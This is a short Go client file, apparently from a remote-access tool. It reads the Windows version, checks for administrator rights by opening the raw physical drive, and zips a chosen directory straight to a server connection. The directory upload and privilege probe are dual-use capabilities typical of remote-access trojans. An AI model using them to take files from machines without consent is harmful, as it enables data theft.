package client

import (
	"bytes"
	"errors"
	"os"
	"os/exec"
	"strings"

	"github.com/pierrre/archivefile/zip"
)

// GetVer gets the major version of the current installed
// Windows
func GetVer() (int, error) {
	cmd := exec.Command("cmd", "ver")
	var out bytes.Buffer
	var stderr bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &stderr
	err := cmd.Run()
	if err != nil {
		return 0, err
	}
	osStr := strings.Replace(out.String(), "\n", "", -1)
	osStr = strings.Replace(osStr, "\r\n", "", -1)
	tmp1 := strings.Index(osStr, "[Version")
	tmp2 := strings.Index(osStr, "]")
	var ver string
	if tmp1 == -1 || tmp2 == -1 {
		return 0, errors.New("Version string has wrong format")
	}
	ver = osStr[tmp1+9 : tmp2]
	if strings.HasPrefix(ver, "10.") {
		return 10, nil
	}
	return 0, errors.New(ver)
}

// CheckElevate checks whether the current process has administrator
// priviliges
func CheckElevate() bool {
	_, err := os.Open("\\\\.\\PHYSICALDRIVE0")
	if err != nil {
		return false
	}
	return true
}

// TODO: Remove Zipdir because .zip files are insecure and can be exploited
// Zipdir archives files to zip and sends them to server
func (c *connection) Zipdir(path string) error {
	progress := func(archivePath string) {
	}
	return zip.Archive(path, c.Conn, progress)
}
